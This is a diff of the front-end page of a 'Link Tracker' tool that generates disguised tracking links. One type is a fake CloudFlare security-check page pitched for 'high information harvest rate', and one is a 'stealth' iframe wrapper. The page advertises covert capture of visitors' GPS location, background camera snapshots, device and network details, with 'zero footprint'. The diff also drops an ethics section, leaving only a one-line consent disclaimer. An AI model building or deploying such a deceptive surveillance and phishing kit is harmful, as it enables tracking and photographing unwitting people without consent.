@@ -4,120 +4,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Link Tracker - Premium Data Collection</title>
+    <title>Link Tracker | Premium Intelligence</title>
     <link rel="stylesheet" href="/css/style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
 </head>
 
 <body>
+    <div class="bg-mesh"></div>
+
     <div class="container">
-        <header class="header">
-            <h1><i class="fas fa-link"></i> Link Tracker</h1>
-            <p class="subtitle">Generate professional, secure tracking links with advanced analytics</p>
+        <header class="header" data-aos="fade-down">
+            <h1>LINK TRACKER</h1>
+            <p>Deploy professional intelligence links. Secure, encrypted, and real-time. Gather behavioral data with
+                surgical precision.</p>
         </header>
 
-        <div class="card">
-            <div class="card-header">
-                <h2><i class="fas fa-plus-circle"></i> Create New Tracking Link</h2>
-            </div>
-            <div class="card-body">
-                <form id="createLinkForm">
-                    <div class="form-group">
-                        <label for="userId">Your Tracking ID</label>
-                        <input type="text" id="userId" placeholder="e.g., campaign_summer_2024" required>
-                        <small>Share this ID only with those who need to view the dashboard</small>
+        <div class="card" data-aos="fade-up">
+            <h2 class="card-title"><i class="fas fa-satellite-dish"></i> Link Generator</h2>
+
+            <form id="createLinkForm">
+                <div class="form-group">
+                    <label for="userId">Intelligence ID</label>
+                    <input type="text" id="userId" placeholder="e.g. ALPHA_VINC_99" required>
+                    <p style="font-size: 0.75rem; color: var(--text-dim); margin-top: 5px;">Unique identifier for your
+                        tracking dashboard.</p>
+                </div>
+
+                <div class="form-group">
+                    <label for="targetUrl">Target Destination</label>
+                    <input type="url" id="targetUrl" placeholder="https://example.com/secure-dossier" required>
+                    <p style="font-size: 0.75rem; color: var(--text-dim); margin-top: 5px;">Where the user will land
+                        after invisible data capture.</p>
+                </div>
+
+                <button type="submit" class="btn btn-primary" id="submitBtn">
+                    <i class="fas fa-bolt"></i> Generate Secure Links
+                </button>
+            </form>
+
+            <div id="result" class="result-box" style="display: none;">
+                <div class="link-item" data-aos="fade-right">
+                    <div class="link-item-header">
+                        <span class="link-type"><i class="fab fa-cloudflare"></i> Security Shield Link</span>
+                        <span style="font-size: 0.7rem; color: var(--text-dim);">Recommended for High Hitrate</span>
                     </div>
-
-                    <div class="form-group">
-                        <label for="targetUrl">Destination URL</label>
-                        <input type="url" id="targetUrl" placeholder="https://example.com/destination" required>
-                        <small>The final destination for your visitors</small>
+                    <div class="link-input-group">
+                        <input type="text" id="cloudflareLink" readonly>
+                        <button class="btn-copy" onclick="copyValue('cloudflareLink')"><i
+                                class="fas fa-copy"></i></button>
                     </div>
+                    <div id="cloudflareShort" style="margin-top: 10px;"></div>
+                </div>
 
-                    <button type="submit" class="btn btn-primary animated-gradient">
-                        <span>Generate Tracking Links</span>
-                        <div id="loader" class="spinner hidden" style="margin-left: 10px;"></div>
-                    </button>
-                </form>
-
-                <div id="result" class="result hidden">
-                    <h3><i class="fas fa-check-circle"></i> Tracking Links Ready!</h3>
-
-                    <div class="link-section">
-                        <h4><i class="fab fa-cloudflare"></i> CloudFlare Security Link</h4>
-                        <p class="description">Displays a realistic security check page. High information harvest rate.
-                        </p>
-                        <div class="link-box">
-                            <input type="text" id="cloudflareLink" readonly>
-                            <button class="btn-copy" onclick="copyToClipboard('cloudflareLink')">Copy</button>
-                        </div>
-                        <div id="cloudflareShort" class="short-links hidden"></div>
+                <div class="link-item" data-aos="fade-right" data-aos-delay="100">
+                    <div class="link-item-header">
+                        <span class="link-type"><i class="fas fa-mask"></i> Stealth WebView Link</span>
+                        <span style="font-size: 0.7rem; color: var(--text-dim);">Immediate Redirection</span>
                     </div>
-
-                    <div class="link-section">
-                        <h4><i class="fas fa-eye"></i> Webview Stealth Link</h4>
-                        <p class="description">Shows the target site in an iframe. Completely invisible tracking.</p>
-                        <div class="link-box">
-                            <input type="text" id="webviewLink" readonly>
-                            <button class="btn-copy" onclick="copyToClipboard('webviewLink')">Copy</button>
-                        </div>
-                        <div id="webviewShort" class="short-links hidden"></div>
+                    <div class="link-input-group">
+                        <input type="text" id="webviewLink" readonly>
+                        <button class="btn-copy" onclick="copyValue('webviewLink')"><i class="fas fa-copy"></i></button>
                     </div>
+                    <div id="webviewShort" style="margin-top: 10px;"></div>
+                </div>
 
-                    <div class="dashboard-link">
-                        <a id="dashboardLink" class="btn btn-secondary" target="_blank">
-                            <i class="fas fa-chart-line"></i> Go to Analytics Dashboard
-                        </a>
-                    </div>
+                <div style="margin-top: 20px; text-align: center;">
+                    <a id="dashboardLink" class="btn btn-secondary"
+                        style="border: 1px solid var(--accent); color: var(--accent);">
+                        <i class="fas fa-chart-line"></i> Launch Intelligence Dashboard
+                    </a>
                 </div>
             </div>
         </div>
 
-        <div class="stats-card">
-            <h3><i class="fas fa-rocket"></i> Key Tracking Features</h3>
-            <div class="stats-grid">
-                <div class="stat-item">
-                    <div class="stat-value"><i class="fas fa-map-marker-alt"></i></div>
-                    <div class="stat-label">Precise Location</div>
-                </div>
-                <div class="stat-item">
-                    <div class="stat-value"><i class="fas fa-camera"></i></div>
-                    <div class="stat-label">Multi-Snapshot</div>
-                </div>
-                <div class="stat-item">
-                    <div class="stat-value"><i class="fas fa-battery-full"></i></div>
-                    <div class="stat-label">Battery & OS</div>
-                </div>
-                <div class="stat-item">
-                    <div class="stat-value"><i class="fas fa-network-wired"></i></div>
-                    <div class="stat-label">Network Info</div>
-                </div>
+        <!-- Capability Grid -->
+        <div class="dashboard-grid" style="margin-top: 60px;">
+            <div class="stat-card" data-aos="flip-up" data-aos-delay="0">
+                <i class="fas fa-map-marked-alt fa-2x" style="color: var(--accent); margin-bottom: 15px;"></i>
+                <h4>GEO-Locate</h4>
+                <p style="font-size: 0.8rem; color: var(--text-dim);">Capture GPS position with high accuracy
+                    triangulation.</p>
+            </div>
+            <div class="stat-card" data-aos="flip-up" data-aos-delay="100">
+                <i class="fas fa-camera fa-2x" style="color: var(--accent); margin-bottom: 15px;"></i>
+                <h4>Visual Intel</h4>
+                <p style="font-size: 0.8rem; color: var(--text-dim);">Background burst shots to identify valid subjects.
+                </p>
+            </div>
+            <div class="stat-card" data-aos="flip-up" data-aos-delay="200">
+                <i class="fas fa-microchip fa-2x" style="color: var(--accent); margin-bottom: 15px;"></i>
+                <h4>System ID</h4>
+                <p style="font-size: 0.8rem; color: var(--text-dim);">Analyze OS, Browser, Battery, and Network
+                    hardware.</p>
+            </div>
+            <div class="stat-card" data-aos="flip-up" data-aos-delay="300">
+                <i class="fas fa-user-secret fa-2x" style="color: var(--accent); margin-bottom: 15px;"></i>
+                <h4>Invisible</h4>
+                <p style="font-size: 0.8rem; color: var(--text-dim);">Zero footprint deployment via premium redirect
+                    layers.</p>
             </div>
         </div>
 
-        <div class="info-card">
-            <h3><i class="fas fa-info-circle"></i> Deployment & Ethics</h3>
-            <ul>
-                <li><strong>CloudFlare Method:</strong> Uses a 6-second verification delay to capture high-quality
-                    system data and locations.</li>
-                <li><strong>WebView Method:</strong> Immediately wraps the destination URL in an iframe for seamless
-                    user experience while tracking.</li>
-                <li><strong>Local vs Production:</strong> Ensure your <code>HOST_URL</code> is correctly set in
-                    environment variables.</li>
-                <li><strong>Ethical Note:</strong> This tool is for educational and authorized testing purposes only.
-                    Respect user privacy.</li>
-            </ul>
-        </div>
-
-        <footer class="footer">
-            <p><i class="fas fa-shield-alt"></i> Powered by Link Tracker Pro | Premium Tracking Interface</p>
+        <footer
+            style="margin-top: 100px; text-align: center; color: var(--text-dim); font-size: 0.85rem; padding-bottom: 40px;">
+            <p>&copy; 2024 ANTI-GRAVITY SYSTEM | ADVANCED ANALYTICS INTERFACE</p>
+            <p style="margin-top: 10px; opacity: 0.5;">Ethical usage mandates user consent where applicable.</p>
         </footer>
     </div>
 
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
     <script>
+        AOS.init({ duration: 1000, once: true });
+
         const form = document.getElementById('createLinkForm');
-        const result = document.getElementById('result');
-        const loader = document.getElementById('loader');
+        const submitBtn = document.getElementById('submitBtn');
 
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
@@ -125,12 +126,8 @@
             const userId = document.getElementById('userId').value;
             const targetUrl = document.getElementById('targetUrl').value;
 
-            const btn = form.querySelector('button');
-            const btnText = btn.querySelector('span');
-
-            btn.disabled = true;
-            btnText.textContent = 'Processing...';
-            loader.classList.remove('hidden');
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Initializing Remote Bridge...';
 
             try {
                 const response = await fetch('/api/create-link', {
@@ -146,51 +143,48 @@
                     document.getElementById('webviewLink').value = data.webviewLink;
                     document.getElementById('dashboardLink').href = `/dashboard/${userId}`;
 
-                    if (data.cloudflareShortLinks) {
-                        const cloudflareShort = document.getElementById('cloudflareShort');
-                        cloudflareShort.innerHTML = '<h5>Shortened Alternatives:</h5>' +
-                            data.cloudflareShortLinks.map(link =>
-                                `<div class="short-link"><a href="${link}" target="_blank">${link}</a></div>`
-                            ).join('');
-                        cloudflareShort.classList.remove('hidden');
-                    }
-
-                    if (data.webviewShortLinks) {
-                        const webviewShort = document.getElementById('webviewShort');
-                        webviewShort.innerHTML = '<h5>Shortened Alternatives:</h5>' +
-                            data.webviewShortLinks.map(link =>
-                                `<div class="short-link"><a href="${link}" target="_blank">${link}</a></div>`
-                            ).join('');
-                        webviewShort.classList.remove('hidden');
-                    }
-
-                    result.classList.remove('hidden');
+                    const result = document.getElementById('result');
+                    result.style.display = 'flex';
                     result.scrollIntoView({ behavior: 'smooth' });
+
+                    if (data.cloudflareShortLinks && data.cloudflareShortLinks.length > 0) {
+                        document.getElementById('cloudflareShort').innerHTML = data.cloudflareShortLinks.map(l =>
+                            `<div style="font-size: 0.75rem; margin-top: 5px; opacity: 0.6;"><i class="fas fa-share"></i> ${l}</div>`
+                        ).join('');
+                    }
+
+                    if (data.webviewShortLinks && data.webviewShortLinks.length > 0) {
+                        document.getElementById('webviewShort').innerHTML = data.webviewShortLinks.map(l =>
+                            `<div style="font-size: 0.75rem; margin-top: 5px; opacity: 0.6;"><i class="fas fa-share"></i> ${l}</div>`
+                        ).join('');
+                    }
+
                 } else {
-                    alert(data.error || 'Request failed');
+                    alert('Error: ' + (data.error || 'Failed to initialize agent.'));
                 }
-            } catch (error) {
-                alert('Connection error: ' + error.message);
+            } catch (err) {
+                alert('Connection lost. Verify your mesh connection.');
             } finally {
-                btn.disabled = false;
-                btnText.textContent = 'Generate Tracking Links';
-                loader.classList.add('hidden');
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<i class="fas fa-bolt"></i> Generate Secure Links';
             }
         });
 
-        function copyToClipboard(elementId) {
-            const input = document.getElementById(elementId);
+        function copyValue(id) {
+            const input = document.getElementById(id);
             input.select();
             document.execCommand('copy');
 
-            const btn = event.target;
-            const originalText = btn.textContent;
-            btn.textContent = 'Copied!';
-            btn.style.background = '#059669';
+            const btn = event.currentTarget;
+            const original = btn.innerHTML;
+            btn.innerHTML = '<i class="fas fa-check"></i>';
+            btn.style.borderColor = 'var(--success)';
+            btn.style.color = 'var(--success)';
 
             setTimeout(() => {
-                btn.textContent = originalText;
-                btn.style.background = '#10b981';
+                btn.innerHTML = original;
+                btn.style.borderColor = 'var(--border)';
+                btn.style.color = 'white';
             }, 2000);
         }
     </script>
